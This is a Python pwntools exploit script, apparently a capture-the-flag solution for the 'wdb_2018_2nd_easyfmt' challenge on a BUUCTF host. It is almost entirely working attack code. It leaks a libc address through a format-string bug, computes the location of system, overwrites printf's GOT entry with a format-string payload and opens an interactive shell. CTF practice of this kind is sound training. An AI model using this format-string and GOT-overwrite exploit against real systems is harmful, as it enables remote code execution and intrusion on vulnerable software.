#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 20.06.45
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*
context.arch = 'i386'

host = 'node3.buuoj.cn'
port = 27305
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./wdb_2018_2nd_easyfmt')
	sh = process('./wdb_2018_2nd_easyfmt')
else:
	#context.log_level = 'debug'
	# libc=ELF('/lib/i386-linux-gnu/libc.so.6')
	elf = ELF('./wdb_2018_2nd_easyfmt')
	sh = remote(host,port)



def pwn():
	sh.sendline('A'*8)
	sh.recv()

	payload = '%7$s' + p32(elf.got['__libc_start_main'])
	sh.sendline(payload)
	__libc_start_main_addr = u32(sh.recv(4))
	libc_s = LibcSearcher('__libc_start_main',__libc_start_main_addr)
	libc_Addr = __libc_start_main_addr - libc_s.dump('__libc_start_main')
	system_add = libc_Addr + libc_s.dump('system')
	success('__libc_start_main_addr:0x%x'%(__libc_start_main_addr))
	success('libc_Addr:0x%x'%(libc_Addr))
	
	payload = fmtstr_payload(6,{elf.got['printf']:system_add})
	sh.sendline(payload)


if __name__ == '__main__':
	pwn()
	sh.interactive()

